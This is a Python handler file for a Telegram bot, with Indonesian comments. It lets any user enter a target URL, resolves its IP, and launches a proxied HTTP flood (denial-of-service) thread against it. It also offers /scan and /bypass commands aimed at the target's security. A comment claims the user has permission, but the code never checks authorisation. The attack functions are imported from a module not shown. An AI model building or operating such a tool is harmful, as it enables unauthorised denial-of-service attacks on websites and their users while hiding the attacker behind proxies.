# handlers/handlers.py
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import TOKEN, IMAGE_URL
from functions import *
from attacks import *
from utils import send_live_status

# Inisialisasi bot
bot = telebot.TeleBot(TOKEN)

# Handle /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    # Membuat tombol inline
    markup = InlineKeyboardMarkup()
    btn_yes = InlineKeyboardButton("𝗬𝗲𝘀!", callback_data="yes")
    btn_no = InlineKeyboardButton("𝗡𝗼.", callback_data="no")
    markup.add(btn_yes, btn_no)
    # Kirim teks welcome + gambar + tombol dalam satu pesan
    try:
        bot.send_photo(
            chat_id, IMAGE_URL, caption=
            "𝗚𝗼𝗱 𝗵𝗮𝘀 𝗻𝗼 𝗱𝗲𝗮𝗱\n"
            "𝗧𝗵𝗲 𝗰𝗵𝗼𝗶𝗰𝗲 𝗶𝘀 𝘆𝗼𝘂𝗿𝘀, 𝗯𝘂𝘁 𝗴𝗼𝗱 𝗶𝘀 𝗻𝗼𝘁 𝗱𝗲𝗮𝗱",
            reply_markup=markup
        )
    except Exception as e:
        bot.send_message(chat_id, f"**Gagal mengirim gambar.**\nError: `{e}`", parse_mode="Markdown")

# Handle tombol Yes/No
@bot.callback_query_handler(func=lambda call: call.data in ["yes", "no"])
def handle_response(call):
    if call.data == "yes":
        bot.send_message(call.message.chat.id, "**Great! Now, please enter the target URL:**", parse_mode="Markdown")
        user_data[call.message.chat.id] = {}
    else:
        bot.send_message(call.message.chat.id, "**Okay, terima kasih!**", parse_mode="Markdown")

# Handle input URL
@bot.message_handler(func=lambda message: 'ip' not in user_data.get(message.chat.id, {}))
def handle_url(message):
    chat_id = message.chat.id
    url = message.text
    try:
        ip = socket.gethostbyname(url)
        port = 80
        user_data[chat_id]['ip'] = ip
        user_data[chat_id]['port'] = port
        # Dapatkan informasi website (sudah mendapatkan izin)
        website_info = get_website_info(ip)
        # Kirim informasi website ke pengguna
        bot.reply_to(message, f"**Target ditemukan!**\nIP: `{ip}`\nPort: `{port}`\n\n{website_info}\n\nLanjutkan? (Ya/Tidak)", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"**Gagal menemukan IP target!**\nError: `{e}`", parse_mode="Markdown")

# Handle konfirmasi request
@bot.message_handler(func=lambda message: message.text.lower() in ["ya", "tidak"] and message.chat.id in user_data)
def handle_ddos_confirmation(message):
    chat_id = message.chat.id
    response = message.text.lower()
    if response == "ya":
        ip = user_data[chat_id]['ip']
        port = user_data[chat_id]['port']
        proxies = fetch_proxies()
        if proxies:
            proxy = get_random_proxy(proxies)
            if proxy is not None:
                bot.reply_to(message, f"**Meluncurkan serangan ke:** `{ip}:{port}`\nMenggunakan proxy: `{proxy}`", parse_mode="Markdown")
                attack_thread = threading.Thread(target=http_flood, args=(ip, port, chat_id, proxy))
                attack_thread.start()
                status_thread = threading.Thread(target=send_live_status, args=(bot, chat_id,))
                status_thread.start()
            else:
                bot.reply_to(message, "**Tidak ada proxy yang tersedia!**", parse_mode="Markdown")
    else:
        bot.reply_to(message, "**Serangan dibatalkan!**", parse_mode="Markdown")

# Handle /stop
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    chat_id = message.chat.id
    if chat_id in attack_status:
        attack_status[chat_id]['running'] = False
        bot.reply_to(message, "**Serangan dihentikan!**", parse_mode="Markdown")
    else:
        bot.reply_to(message, "**Tidak ada serangan yang berjalan!**", parse_mode="Markdown")

# Handle /scan
@bot.message_handler(commands=['scan'])
def handle_scan(message):
    chat_id = message.chat.id
    if chat_id in user_data and 'ip' in user_data[chat_id]:
        ip = user_data[chat_id]['ip']
        scan_result = scan_website_security(ip)
        bot.reply_to(message, f"**Hasil Scan Keamanan:**\n```{scan_result}```", parse_mode="Markdown")
    else:
        bot.reply_to(message, "**Silakan masukkan target URL terlebih dahulu!**", parse_mode="Markdown")

# Handle /bypass
@bot.message_handler(commands=['bypass'])
def handle_bypass(message):
    chat_id = message.chat.id
    if chat_id in user_data and 'ip' in user_data[chat_id] and 'port' in user_data[chat_id]:
        ip = user_data[chat_id]['ip']
        port = user_data[chat_id]['port']
        bypass_result = bypass_security(ip, port)
        bot.reply_to(message, bypass_result, parse_mode="Markdown")
    else:
        bot.reply_to(message, "**Silakan masukkan target URL terlebih dahulu!**", parse_mode="Markdown")
